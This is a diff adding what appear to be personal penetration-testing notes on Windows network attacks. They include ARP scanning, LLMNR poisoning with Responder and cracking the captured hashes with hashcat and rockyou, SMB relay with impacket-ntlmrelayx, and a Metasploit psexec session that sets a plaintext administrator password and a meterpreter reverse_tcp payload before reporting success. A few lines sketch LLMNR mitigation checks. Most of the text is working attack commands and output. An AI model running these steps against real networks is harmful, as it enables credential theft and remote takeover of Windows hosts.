@@ -1,0 +1,84 @@
+Pre-compromise attacks and Process
+************************************************************
+
+Intranet enumeration:
+**********************
+sudo arp-scan -l
+
+LLMNR attack/mitigation/Automation Ideas from mitigation:
+************************************************************
+
+"LLMNR Attack script steps"
+***************************
+
+sudo responder -I eth0 -dwv
+
+hashcat -m 5600 has.txt Documents/rockyou.txt --force -S -w 3
+
+From "LLMNR mitigation steps" to Automation Check ideas (Pre-compromise attack vector)
+************************************************************************
+Disable LLMNR & NBT-NS
+- vbscript command check for field status (local computer policy -> computer configuration -> administrative templates -> network -> "DNS client" in Group policy editor -> "Turn OFF multicast Name resolution")
+- LLMNR attack check "hash get and output each step" ("responder to get the hash" -> "crop/trim the hash output" -> "pass the to hashcat for decryption" -> "output the cleartext pwd" )
+
+SMB Relay attack:
+****************************
+	-> without hash info gather and decrypt for connectivity.
+	-> Direct relay connect using "ntlmrelayx"
+	
+Pre-requisite:
+****************************
+- relayed user must be administrator on the system
+- smb disabled in admin system
+
+- cat /usr/bin/../share/responder/Responder.conf 
+	-> File link/redirect to "etc" location as shown in below script
+	-> (Turn off SMB and HTTP)
+or directly edit and update
+
+- cat /etc/responder/Responder.conf
+	-> (Turn off SMB and HTTP)
+
+
+	
+
+sudo responder -I eth0 -dwv
+sudo responder -i 192.168.1.4 -dwv
+
+impacket-ntlmrelayx --help
+impacket-ntlmrelayx -t 192.168.1.4
+sudo impacket-ntlmrelayx -t 192.168.1.4 -smb2support
+impacket-ntlmrelayx -t 192.168.1.4 -smb2support -remove-target
+impacket-ntlmrelayx -t 192.168.1.4 -smb2support --remove-mic
+
+MSFconsole:
+************
+
+msf6 > search psexec
+msf6 > use 4
+msf6 exploit(windows/smb/psexec) > info
+msf6 exploit(windows/smb/psexec) > set SMBdomain domainnameman.local
+SMBdomain => domainnameman.local
+msf6 exploit(windows/smb/psexec) > set SMBUser administrator
+SMBUser => administrator
+msf6 exploit(windows/smb/psexec) > set SMBpass Qwerty@123
+SMBpass => Qwerty@123
+msf6 exploit(windows/smb/psexec) > set rhosts 192.168.1.4
+rhosts => 192.168.1.4
+msf6 exploit(windows/smb/psexec) > info
+msf6 exploit(windows/smb/psexec) > show targets 
+msf6 exploit(windows/smb/psexec) > set target 2
+msf6 exploit(windows/smb/psexec) > set payload
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/psexec) > set payload windows/
+Display all 279 possibilities? (y or n)
+msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/psexec) > info
+msf6 exploit(windows/smb/psexec) > run
+
+************************************
+	attack successfull
+************************************
+
+
